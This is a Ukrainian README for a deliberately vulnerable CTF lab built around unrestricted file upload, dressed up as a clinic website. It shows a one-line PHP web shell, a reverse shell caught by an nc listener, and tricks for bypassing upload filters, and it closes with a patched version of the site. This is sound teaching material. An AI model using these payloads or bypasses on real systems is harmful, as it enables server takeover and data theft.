# МедЦентр Пульс — Unrestricted File Upload (CTF)

Навчальний стенд для демонстрації класу вразливостей **Unrestricted File
Upload** (OWASP A04 / CWE-434), оформлений під сайт клініки сімейної
медицини, у біло-синіх тонах.

## Структура

```
hospital/
├── index.php        # головна сторінка клініки
├── review.php        # форма "Залишити відгук" із завантаженням файлу
├── upload.php         # обробник завантаження (ВРАЗЛИВИЙ, див. коментарі [VULN])
├── style.css          # біло-синя тема
├── flag.txt            # прапор, доступний через веб-шелл
├── uploads/
│   ├── .htaccess       # дозволяє виконання .php (частина вразливості)
│   └── .gitkeep
├── exploit/
│   └── reverse_shell.php  # payload для розв'язку; НЕ деплоїться разом із сайтом,
│                           # гравець сам завантажує його через форму
└── README.md
```

## Як розгорнути локально (Windows, PowerShell)

```powershell
cd hospital
.\run-local.ps1
```

Скрипт сам завантажить PHP (якщо його ще немає), розпакує в `C:\php`,
додасть у PATH для поточної сесії термінала й підніме сайт на
`http://localhost:8080`.

### Альтернатива — Docker (ближче до реального Apache+mod_php)

```dockerfile
FROM php:8.2-apache
COPY . /var/www/html/
RUN chown -R www-data:www-data /var/www/html/uploads
```

```bash
docker build -t hospital-ctf .
docker run -p 8080:80 hospital-ctf
```

## Вразливість

У `upload.php` немає:
1. Перевірки MIME-типу / magic bytes файлу.
2. Білого списку дозволених розширень.
3. Заборони виконання скриптів у директорії завантажень.

Це дозволяє завантажити файл з розширенням `.php` під виглядом "скану
направлення" і отримати виконання коду на сервері.

## Інтендований розв'язок

### Варіант 1 — простий веб-шелл (швидка перевірка RCE)

1. Відкрити `review.php`, заповнити поля форми.
2. Замість документа обрати файл `shell.php`:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
3. Надіслати форму — сервер поверне шлях до завантаженого файлу
   (`review.php?ok=1&f=uploads/review_XXXXXXXX_shell.php`).
4. Перейти за адресою
   `http://<host>/uploads/review_XXXXXXXX_shell.php?cmd=cat+../flag.txt`
   (на Windows-бекенді — `type` замість `cat`) і отримати вміст `flag.txt`.

### Варіант 2 — повноцінний reverse shell (`exploit/reverse_shell.php`)

1. На своїй машині (атакуючій) піднімаєш слухач:
   ```bash
   nc -lvnp 4444
   ```
2. У файлі `exploit/reverse_shell.php` вказуєш свій IP та порт слухача
   (`$ip`, `$port`).
3. Завантажуєш `reverse_shell.php` через форму `review.php` замість
   скану документа.
4. Переходиш у браузері на отриманий шлях
   `http://<host>/uploads/review_XXXXXXXX_reverse_shell.php` — файл
   виконається на сервері, зʼєднається з твоїм слухачем.
5. У терміналі з `nc` з'явиться інтерактивна оболонка:
   ```bash
   cat flag.txt
   # або, якщо флаг лежить поза веб-коренем:
   find / -iname "flag*" 2>/dev/null
   ```

> Примітка для деплою через Docker: якщо слухач `nc` запущено на хості,
> а контейнер — в окремій Docker-мережі, на Linux найпростіше тимчасово
> запустити контейнер з `--network host`; на Mac/Windows — використати
> `host.docker.internal` як IP у `$ip`.

### Можливі додаткові фільтри для ускладнення завдання
- перевірка лише `$_FILES['attachment']['type']` (Content-Type підробляється клієнтом);
- чорний список розширень без урахування регістру/подвійних розширень
  (`.pHp`, `.php.jpg`, `.phtml`, `.phar`);
- перевірка магічних байтів лише на `%PDF` (можна додати валідний
  PDF-заголовок перед PHP-кодом і завантажити як `.php`).

## Варіант "патч" (безпечна версія, для write-up "до/після")

У `uploads/.htaccess` розкоментуйте блок `FilesMatch`, що забороняє
виконання `.php*`-файлів, і додайте в `upload.php`:
- перевірку magic bytes (`finfo_file`),
- білий список розширень (`jpg`, `jpeg`, `png`, `pdf`),
- генерацію імені файлу без використання оригінального (`uniqid() . '.jpg'`),
- збереження завантажень поза веб-коренем з окремою видачею через скрипт.
